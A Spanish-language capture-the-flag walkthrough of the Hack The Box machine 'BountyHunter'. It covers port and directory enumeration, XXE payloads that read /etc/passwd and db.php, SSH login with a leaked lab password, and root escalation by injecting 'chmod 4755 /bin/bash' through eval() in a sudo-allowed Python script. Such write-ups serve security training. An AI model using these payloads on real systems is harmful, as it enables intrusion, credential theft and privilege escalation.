# BOUNTYHUNTER

## Reconocimiento

### Nmap
Lo primero que haremos será enumerar los puertos abiertos en la máquina víctima, para ello usaremos [nmap](https://github.com/nmap/nmap), al que le indicaremos que queremos filtrar el rango de puertos completo, que solo nos muestre los puertos que estén abiertos y que usaremos el método de enumeración TCP Syn Port Scan. Opcionalmente se pueden desactivar el descubrimiento de hosts y la resolución DNS para agilizar el escaneo. Por último, exportaremos las evidencias al fichero allPorts:

```bash
map -p- -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.11.100
```

```bash
File: allPorts


# Nmap 7.91 scan initiated Tue Aug  3 18:20:54 2021 as: nmap -p- -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.11.100
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.100 ()	Status: Up
Host: 10.10.11.100 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///	Ignored State: closed (65533)
# Nmap done at Tue Aug  3 18:21:08 2021 -- 1 IP address (1 host up) scanned in 13.80 seconds
```

<br>

Efectuaremos un escaneo más exhaustivo para ver los servicios y versiones que corren bajo estos puertos abiertos, exportaremos las evidencias al fichero targeted:

```bash
nmap -sC -sV -p22,80 -oN targeted 10.10.11.100
```

```bash
File: targeted


# Nmap 7.91 scan initiated Tue Aug  3 12:54:08 2021 as: nmap -sC -sV -p22,80 -oN targeted 10.10.11.100
Nmap scan report for 10.10.11.100
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug  3 12:54:17 2021 -- 1 IP address (1 host up) scanned in 8.93 seconds
```

<br>

Como vemos, tenemos solamente abiertos el puerto 22 (SSH) y el puerto 80 (HTTP).

<br>

### Servidor web
Comenzaremos enumerando el servidor web.

Si accedemos desde el navegador al servidor web nos encontraremos con lo siguiente:

<img src="https://i.imgur.com/FCrEncO.png" width=700>

Vemos que es una página bastante simple por lo que procederemos a examinar sus recursos. En la pestaña portal nos encontraremos con lo siguiente:

<img src="https://i.imgur.com/JYBMeXu.png" width=700>

Este hipervínculo nos dirigirá a la página **log_submit.php** que contará con el siguiente formulario:

<img src="https://i.imgur.com/NF0awiv.png" width=700>

<br>

### Fuzzing
Ya que no tenemos un vector de ataque claro contra el servidor web, procederemos a fuzzear el mismo en busca de rutas potenciales de ataque. Empezaremos fuzzeando directorios en la raíz del servidor web. Para ello, usaremos [wfuzz](https://github.com/xmendez/wfuzz) junto al diccionario **directory-list-2.3-medium.txt**:

```bash
wfuzz -c --hc=404 -f fuzzRoot,raw -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.100/FUZZ
```

```bash
File: fuzzRoot


Target: http://10.10.11.100/FUZZ
Total requests: 220560
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00001:  C=200    388 L	    1470 W	  25168 Ch	  "# directory-list-2.3-medium.txt"
00003:  C=200    388 L	    1470 W	  25168 Ch	  "# Copyright 2007 James Fisher"
00007:  C=200    388 L	    1470 W	  25168 Ch	  "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"
00014:  C=200    388 L	    1470 W	  25168 Ch	  "http://10.10.11.100/"
00012:  C=200    388 L	    1470 W	  25168 Ch	  "# on atleast 2 different hosts"
00013:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00011:  C=200    388 L	    1470 W	  25168 Ch	  "# Priority ordered case sensative list, where entries were found"
00010:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00009:  C=200    388 L	    1470 W	  25168 Ch	  "# Suite 300, San Francisco, California, 94105, USA."
00006:  C=200    388 L	    1470 W	  25168 Ch	  "# Attribution-Share Alike 3.0 License. To view a copy of this"
00008:  C=200    388 L	    1470 W	  25168 Ch	  "# or send a letter to Creative Commons, 171 Second Street,"
00005:  C=200    388 L	    1470 W	  25168 Ch	  "# This work is licensed under the Creative Commons"
00002:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00004:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00084:  C=301      9 L	      28 W	    316 Ch	  "resources"
00291:  C=301      9 L	      28 W	    313 Ch	  "assets"
00550:  C=301      9 L	      28 W	    310 Ch	  "css"
00953:  C=301      9 L	      28 W	    309 Ch	  "js"
45240:  C=200    388 L	    1470 W	  25168 Ch	  "http://10.10.11.100/"

Total time: 0
Processed Requests: 46079
Filtered Requests: 46060
Requests/sec.: 0
```

Como vemos tenemos varios directorios que al parecer contienen recursos relacionados con el servidor web, como por ejemplo el directorio **resources** o el directorio **js**.

Si intentamos acceder a cada uno de estos directorios, veremos que solamente somos capaces de visualizar el directorio **resources**.

Este directorio **resources** contendrá los siguientes archivos:

<img src="https://i.imgur.com/WCG1fdn.png" width=700>

Tendremos dos archivos que nos llamarán bastante la atención, estos archivos son **README.txt** y **bountylog.js**. Si los visualizamos:

```js
File: bountylog.js


function returnSecret(data) {
	return Promise.resolve($.ajax({
            type: "POST",
            data: {"data":data},
            url: "tracker_diRbPr00f314.php"
            }));
}

async function bountySubmit() {
	try {
		var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>${$('#exploitTitle').val()}</title>
		<cwe>${$('#cwe').val()}</cwe>
		<cvss>${$('#cvss').val()}</cvss>
		<reward>${$('#reward').val()}</reward>
		</bugreport>`
		let data = await returnSecret(btoa(xml));
  		$("#return").html(data)
	}
	catch(error) {
		console.log('Error:', error);
	}
}
```

Vemos como el archivo **bountylog.js** es un simple archivo JavaScript que se encarga de enviar vía POST a un recurso PHP, un archivo XML codificado en Base64 que contiene distintos parámetros. Si nos fijamos en los parámetros nos daremos cuenta rápido de que son los mismos que aparecían en el formulario **log_submit.php**. Por lo que intuiremos un vector de ataque mediante XXE (XML External Entity).

```plaintext
File: README.txt


Tasks:

[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
[X] Write tracker submit script
[ ] Connect tracker submit script to the database
[X] Fix developer group permissions
```

En el archivo **README.txt** veremos que nos encontramos antes una lista de tareas. Leyendo la lista de tareas veremos que se ha escrito un script de envío al tracker (Posiblemente bountylog.js), pero que este no ha sido conectado con la base de datos. Tendremos en cuenta más adelante estos datos.

Procederemos a fuzzear más allá el servidor web, en busca de recopilar más información. Hemos visto que la mayoría de los archivos de la página web son de extensión **.php** por lo que procederemos a fuzzear archivos con extensión **php** que se encuentren en la raíz del servidor web:

```bash
wfuzz -c --hc=404 -f fuzzRootPHP,raw -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.100/FUZZ.php
```

```bash
File: fuzzRootPHP


Target: http://10.10.11.100/FUZZ.php
Total requests: 220560
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00001:  C=200    388 L	    1470 W	  25168 Ch	  "# directory-list-2.3-medium.txt"
00007:  C=200    388 L	    1470 W	  25168 Ch	  "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"
00003:  C=200    388 L	    1470 W	  25168 Ch	  "# Copyright 2007 James Fisher"
00015:  C=200    388 L	    1470 W	  25168 Ch	  "index"
00014:  C=403      9 L	      28 W	    277 Ch	  "http://10.10.11.100/.php"
00013:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00012:  C=200    388 L	    1470 W	  25168 Ch	  "# on atleast 2 different hosts"
00011:  C=200    388 L	    1470 W	  25168 Ch	  "# Priority ordered case sensative list, where entries were found"
00010:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00009:  C=200    388 L	    1470 W	  25168 Ch	  "# Suite 300, San Francisco, California, 94105, USA."
00006:  C=200    388 L	    1470 W	  25168 Ch	  "# Attribution-Share Alike 3.0 License. To view a copy of this"
00008:  C=200    388 L	    1470 W	  25168 Ch	  "# or send a letter to Creative Commons, 171 Second Street,"
00005:  C=200    388 L	    1470 W	  25168 Ch	  "# This work is licensed under the Creative Commons"
00002:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00004:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00368:  C=200      5 L	      15 W	    125 Ch	  "portal"
00848:  C=200      0 L	       0 W	      0 Ch	  "db"
45240:  C=403      9 L	      28 W	    277 Ch	  "http://10.10.11.100/.php"

Total time: 0
Processed Requests: 125506
Filtered Requests: 125488
Requests/sec.: 0
```

Veremos los archivos **portal.php** (ya lo conocíamos) y el archivo **db.php**, este último nos llamará la atención ya que este tipo de archivos suele contener las credenciales de acceso a la base de datos en texto claro.

<br> 

## Shell de usuario

### XXE (External XML Entity)
Como hemos descubierto en la fase de enumeración inicial, la página **log_submit.php** enviará a la página **tracker_diRbPr00f314.php** por método POST un archivo XML codificado en Base64 con los parámetros del formulario.

Procederemos a hacer una prueba con el formulario:

<img src="https://i.imgur.com/R4kTN4V.png" width=700>

Trataremos de interceptar esta consultas por medio de [Burpsuite](https://portswigger.net/burp/communitydownload):

<img src="https://i.imgur.com/c6K81V3.png" width=700>

Como vemos, nos encontramos ante un parámetro data que intuimos que es Base64, copiaremos esta data y nos dirigiremos al decoder:

<img src="https://i.imgur.com/EO3SFPW.png" width=700>

Ya que estamos ante una petición HTTP, suponemos que la codificación es Base64 pero URL-Safe. Por lo que lo primero que haremos será decodificarla como URL-Encode y después como Base64. Como vemos, al decodificarlo de esta manera veremos que nos encontramos con un archivo XML que contiene la misma estructura que habíamos visto en **bountylog.js**.

Pasaremos a comprobar con una prueba si el servidor es vulnerable frente ataque XXE (External XML Entity). Para ello, sobre el archivo XML que hemos decodificado, crearemos una nueva entidad externa llamada example, que trataremos de mostrar en el contenido de la etiqueta **reward**:

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY example "test">]>
		<bugreport>
		<title>a</title>
		<cwe>a</cwe>
		<cvss>a</cvss>
		<reward>&example;</reward>
		</bugreport>
```

<img src="https://i.imgur.com/Ny51WHW.png" width=700>

Codificaremos esto en Base64 y después en URL-Encode. Lo insertaremos en el campo **data** de la petición HTTP:

<img src="https://i.imgur.com/tgm5h0L.png" width=700>

<br>

<img src="https://i.imgur.com/Vxny2Ki.png" width=700>

Como vemos, nuestra entidad externa **example**, que contenía la cadena **test** está siendo representada en el campo **reward**. Por lo tanto habremos comprobado que el servidor web es vulnerable frente a XXE (External XML Entinty).

Usaremos el wrapper **file** para tratar de listar archivos internos de la máquina, en este caso listaremos el archivo **/etc/passwd**, usaremos el siguiente payload:

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE reward [ 
	<!ELEMENT reward ANY >
	<!ENTITY file SYSTEM "file:///etc/passwd" >]>
		<bugreport>
		<title>a</title>
		<cwe>a</cwe>
		<cvss>a</cvss>
		<reward>&file;</reward>
		</bugreport>
```

De nuevo codificaremos el payload y lo introduciremos en el campo data de una petición HTTP a **log_submit.php**.

<img src="https://i.imgur.com/xxamDCv.png" width=700>

Como vemos, listaremos el archivo **/etc/passwd** en el que podremos identificar usuarios potenciales en el servidor web. Para ver cuáles son los usuarios de la máquina nos fijaremos en la shell que tenga asignada cada usuario, si nos encontramos con una bash por ejemplo, sabremos que de alguna forma nos podremos conectar como ese usuario. En este caso tendremos los usuarios **development** y **root**.

En este punto trataremos de leer archivos PHP del servidor web sin que estos se interpreten, para ello usaremos un wrapper PHP que nos codificará el contenido del archivo en Base64 y nos lo mostrará. Recordando la fase de enumeracion inicial teniamos un archivo en la raíz del servidor web llamado **db.php**, el cual podía contener credenciales de acceso a la base de datos. Usaremos el siguiente payload:

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE reward [ 
	<!ELEMENT reward ANY >
	<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=db.php" >]>
		<bugreport>
		<title>a</title>
		<cwe>a</cwe>
		<cvss>a</cvss>
		<reward>&file;</reward>
		</bugreport>
```

Decodificaremos la cadena de Base64 que se muestra en la página web. Para ello:

<img src="https://i.imgur.com/DDJnSu9.png" width=700>

Ya que no hemos encontrado ningún panel para logearnos con estas credenciales, recordaremos que en la fase de enumeración inicial teníamos el puerto 22 (SSH) abierto. Ademas de esto habíamos descubierto que en la máquina víctima teníamos el usuario **development**, comprobaremos si la contraseña se está reutilizando para este usuario:

```plaintext
File: sshCreds.txt


admin:m19RoAU0hP41A1sTsq6K
```

Trataremos de conectarnos por SSH con estas credenciales:

```bash
ssh development@10.10.11.100
```

Veremos que nos conectamos como el usuario development:

<img src="https://i.imgur.com/2rtkCWQ.png" width=300>

Visualizaremos la flag **user.txt ** en el directorio **/home/development/user.txt**.

<br>

## Shell de root

### Passwordless sudo
Como el usuario **development** trataremos de escalar privilegios para convertirnos en el usuario **root**. Lo primero que haremos será listar los recursos que podemos ejecutar como otros usuarios. Para ello:

```bash
sudo -l
```

<img src="https://i.imgur.com/04xnPxS.png" width=700>

Veremos que podremos ejecutar como el usuario **root** sin proporcionar contraseña el script **ticketValidator.py** con **python3.8**. 

<br>

### Reversing Python Script
Visualizaremos el script **ticketValidator.py**:

```python
File: ticketValidatorComentado.py


#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):  # i: Numero de la linea         x: Contenido de la linea 
        if i == 0:
            if not x.startswith("# Skytrain Inc"): # Primera linea
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):  # Segunda linea
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):       # Tercera linea
            code_line = i+1
            continue

        if code_line and i == code_line:           # Cuarta linea
            if not x.startswith("**"):             # Tiene que empezar con **
                return False
            ticketCode = x.replace("**", "").split("+")[0] # Tiene que tener un +
            if int(ticketCode) % 7 == 4:           # El primer operando de la suma tiene que tener resto 4 al dividirlo entre 7        x * 7 + 4 = ticketCode
                validationNumber = eval(x.replace("**", "")) # Evalua la expresion completa quitando **
                if validationNumber > 100:         # Hemos conseguido que se evalue por lo que esta validacion no nos importa
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")   # Introducimos la ruta de un archivo
    ticket = load_file(fileName)                   # Comprueba que la extension del archivo sea md
    #DEBUG print(ticket)
    result = evaluate(ticket) 
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

Como vemos, este script validará la estructura de un archivo con extensión md y nos evaluará una línea del mismo. En este punto trataremos de desarrollarnos un archivo malicioso con la estructura que comprueba el script. En este archivo, inyectaremos código malicioso que será evaluado por la función eval( ). Este código malicioso hará que cuando el script sea ejecutado como el usuario **root** este nos otorgue permisos SUID sobre la bash, lo que hará que nos podamos spawnear una bash como el usuario **root**. El payload será:

```md
File: test.md


# Skytrain Inc
## Ticket to hola
__Ticket Code:__
**11+100 and __import__("os").system("chmod 4755 /bin/bash")**
```

Ejecutaremos el script **ticketValidator.py** como el usuario root y le pasaremos nuestro payload:

<img src="https://i.imgur.com/b8qoFeX.png" width=700>

Si listamos los permisos de la bash veremos que esta cuenta con permisos SUID.

Para ejecutar la bash temporalmente como el usuario que la ha creado (root) usaremos el siguiente comando:

```bash
bash -p
```

<img src="https://i.imgur.com/3CfnQXH.png" width=450>

Veremos que tenemos una bash como el usuario root por lo que visualizaremos la flag root.txt en el directorio /root.